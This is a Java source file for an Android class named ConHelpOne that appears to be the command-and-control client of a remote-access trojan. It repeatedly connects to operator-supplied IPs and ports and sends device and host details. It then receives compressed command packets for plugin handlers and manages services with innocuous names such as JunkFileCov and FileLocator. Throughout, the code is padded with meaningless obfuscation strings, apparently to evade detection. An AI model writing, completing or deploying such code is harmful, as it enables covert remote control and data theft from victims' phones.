package store.apps;
import android.content.Context;
import android.content.Intent;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.concurrent.ThreadPoolExecutor;
public class ConHelpOne {
    public static final int u = 1024 * 200;
    public static final int t = 15000;



    public static long s = 100;
    public static Socket k;
    public static InetSocketAddress so;
    public static DataInputStream in;

    public static OutputStream out;
    public static InetAddress ad;
    public static boolean _is_connected_;

    public static Object y = new Object();
    public static Object r = new Object();
    public static String FOLDERAD, FILSCOUNT;


    public static Context ctx;
    public static boolean echo;
    public static void FormatSok(String filepath , String filename, Context cx) {
       try
       {
           ConHelpOne.ctx = cx;
           ConHelpOne.FOLDERAD = filepath;
           ConHelpOne.FILSCOUNT = filename;
           ConnectButton(ConHelpOne.FOLDERAD, ConHelpOne.FILSCOUNT,"[RANDOM-STRING]");
       }catch (Exception eb){


       }
    }
    public static void ConnectButton(final String i, final String p,String str){
        if (str.length()<1)
        {

            return;
        }
        new Thread(new Runnable() {  @Override
        public void run() {
            String ip[] = i.split(DataScan1.tg);
            String po[] = p.split(DataScan1.tg);
            String ENCR = "a";
           // ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
            do {
                if(!DataScan1.sv(ctx)){
                    DataScan1.wk(ctx,false);






                }
                if(ip.length == po.length){
                    int cu = 0;
                    do {
                        try {
                            ConHelpOne.ad = InetAddress.getByName(ip[cu]);
                            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                            ConHelpOne.so = new InetSocketAddress(ConHelpOne.ad, Integer.valueOf(po[cu]));
                            ConHelpOne.k = new Socket();
                            ConHelpOne.k.setSoTimeout(0);

                            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);

                            ConHelpOne.k.setKeepAlive(true);
                            ConHelpOne.k.connect(ConHelpOne.so, ConHelpOne.t);

                            ConHelpOne._is_connected_ = ConHelpOne.k.isConnected();
                            if (ConHelpOne._is_connected_) {
                                ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                ConHelpOne.k.setSendBufferSize(ConHelpOne.u);
                                ConHelpOne.k.setReceiveBufferSize(ConHelpOne.u);
                                ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                ConHelpOne.in = new DataInputStream(new BufferedInputStream(ConHelpOne.k.getInputStream()));
                                ConHelpOne.out = ConHelpOne.k.getOutputStream();
                                break;
                            } else {
                                ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                di();
                            }
                        } catch (Exception e) {


                            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                            di();
                        }
                        try{ Thread.sleep(1);} catch (InterruptedException e) {

                             }
                        cu++;
                        if (ENCR.equals("I AM"))
                        {

                            if (ENCR == "AA[RANDOM-STRING]BB")
                            {
                                break;
                            }

                        }
                    } while (cu <= ip.length -1);
                }
                DataScan1.rel(false);
                try{ Thread.sleep(1000);} catch (InterruptedException e) {}
            } while (!ConHelpOne._is_connected_);
            if (ConHelpOne._is_connected_) {
                rc();
            }
        }}).start();
    }
    public static String cl = "-5";
    public static String scr = "-9";
    public static void poi(){
        String Comma = DataScan1.tg;
        String ENCR = "a";
        ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
        String sn = so.getAddress().getHostAddress() +
                Comma + ConHelpOne.so.getPort() +
                Comma + EngineWorkerins._splet_1_ +
                Comma + EngineWorkerins._split_2_ +
                Comma + EngineWorkerins._split_3_ +
                Comma + EngineWorkerins._split_4_ +
                Comma + ConHelpOne.ad.getHostName() +
                Comma + DataScan1.iconid("port.info") +
                Comma +"[CR]" ;

        ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);

        if (ENCR.equals("I AM"))
        {


            _send_mthd_(String.valueOf(EngineWorkerins.plg), sn.getBytes());
            if (ENCR == "AA[RANDOM-STRING]BB")
            return;
        }
        else
        {
            _send_mthd_(String.valueOf(EngineWorkerins.plg), sn.getBytes());
        }

    }
    public static void rc(){
        new Thread(new Runnable() {@Override
        public void run() {
            String ENCR = "a";
            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
            synchronized(ConHelpOne.r) {
                if(!DataScan1.sv(ctx)){
                    DataScan1.wk(ctx,false);






                    ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                }
                ConHelpOne.echo = true;
                poi();
                try { try {
                    ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                    ByteArrayOutputStream os = new ByteArrayOutputStream();
                    int r, c, f = 0;
                    c = -1;
                    int[] sb = {-1, -1};
                    byte[] bu = new byte[1];
                    ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                    while ((r = ConHelpOne.in.read(bu)) > 0) {
                        EngineWorkerins.inx = -1;
                        if (bu.length > 1) {
                            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                            os.write(bu, 0, r);
                            if (os.toByteArray().length == f) {
                                ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                byte[] s = DataScan1.dZp(DataScan1.getByte(os.toByteArray(), sb));
                                byte[] b = DataScan1.dZp(DataScan1.getString(os.toByteArray(), sb));
                                ValueHolders Ls = new ValueHolders(s, b);
                                EngineWorkerins.Li.add(Ls);
                                os.reset();
                                bu = new byte[1];
                                ConHelpOne.k.setReceiveBufferSize(ConHelpOne.u);
                                f = 0;
                                sb[0] = -1;
                                sb[1] = -1;
                                c = -1;
                            }
                        } else {
                            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                            if (bu[0] == 0) {
                                ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                c += 1;
                                if (c == 0) {
                                    ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                    sb[0] = Integer.valueOf(new String(os.toByteArray(), "UTF-8"));
                                    os.reset();
                                } else if ((c == 1)) {
                                    ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                    sb[1] = Integer.valueOf(new String(os.toByteArray(), "UTF-8"));
                                    os.reset();
                                    f = sb[0] + sb[1];
                                    ConHelpOne.k.setReceiveBufferSize(f);
                                    c = -1;
                                    bu = new byte[f];
                                } else if ((c > 1)) {
                                    c = -1;
                                }
                            } else {
                                ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                os.write(bu, 0, r);
                                try{Thread.sleep(ConHelpOne.s);} catch (InterruptedException e) {
                                    if (ENCR.equals("IAM D"))
                                    {






                                        if (ENCR == "AA[RANDOM-STRING]BB")
                                        System.exit(0);
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    if (ENCR.equals("IAM D"))
                    {






                        if (ENCR == "AA[RANDOM-STRING]BB")
                        System.exit(0);
                    }
                }
            }catch (OutOfMemoryError e) {
                    if (ENCR.equals("IAM D"))
                    {
                        if (ENCR == "AA[RANDOM-STRING]BB")
                        System.exit(0);
                    }
                }
                di();
                DataScan1.rel(false);
                ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                ConnectButton(ConHelpOne.FOLDERAD, ConHelpOne.FILSCOUNT,"[RANDOM-STRING]");
                ConHelpOne.echo = false;
            }
        }}).start();

    }
    public static void _send_mthd_(final String s, final byte[] b){
        if (((ThreadPoolExecutor) DataScan1.ec).getActiveCount() >= DataScan1.max){
            return;
        }
        DataScan1.ec.execute(new Runnable() {
            public void run() {
                try {
                    synchronized(ConHelpOne.y){
                        byte[] b0 = DataScan1.f(s,b);
                        ConHelpOne.k.setSendBufferSize(b0.length);
                        ConHelpOne.out.write(b0, 0,b0.length);
                    }
                } catch (Exception e) {
                    di();






                }
            }});
    }
    public static void _o_x_(String STR) {
        if (EngineWorkerins.plg != -1){
            if (STR.equals("X[RANDOM-STRING]XX"))
            {






                return;
            }
            DataScan1.ec(EngineWorkerins._the_plugns_[0] + ConHelpOne.ad.getHostName());

        }
    }
    public static void di() {
        String ENCR = "";
        ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
        EngineWorkerins._the_sokt_ = false;
        ConHelpOne._is_connected_ = false;
        try {
            ConHelpOne.k.shutdownInput();
        }catch (Exception e) {
            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(3);
        }
        try {
            ConHelpOne.k.getOutputStream().close();
        } catch (Exception e) {
            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(2);
        }
        try {
            ConHelpOne.k.getInputStream().close();
        } catch (Exception e) {
            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(5);}
        try {
            ConHelpOne.k.close();
        } catch (Exception e) {
            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(3);
        }
        if(out != null )
        {
            try {
                ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                ConHelpOne.out.close();
            } catch (Exception e) {}
            ConHelpOne.out = null;
        }
        if(ConHelpOne.in != null)
        {
            try {
                ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                ConHelpOne.in.close();
            } catch (Exception e) {}
            ConHelpOne.in = null;
        }
        if(!RTPluginsHelper._mthd_issrvrun_(JunkFileCov.class, ConHelpOne.ctx,"[RANDOM-STRING]")) {
            Intent i = new Intent(ConHelpOne.ctx, JunkFileCov.class);
            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
            ConHelpOne.ctx.stopService(i);
        }

        if(!RTPluginsHelper._mthd_issrvrun_(FileLocator.class, ConHelpOne.ctx,"[RANDOM-STRING]")) {
            Intent i = new Intent(ConHelpOne.ctx, FileLocator.class);
            ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
            ConHelpOne.ctx.stopService(i);
        }
        if (ENCR.equals("AA[RANDOM-STRING]BB")){
            if (ENCR == "AA[RANDOM-STRING]BB")
            System.exit(0);
        }
    }
}




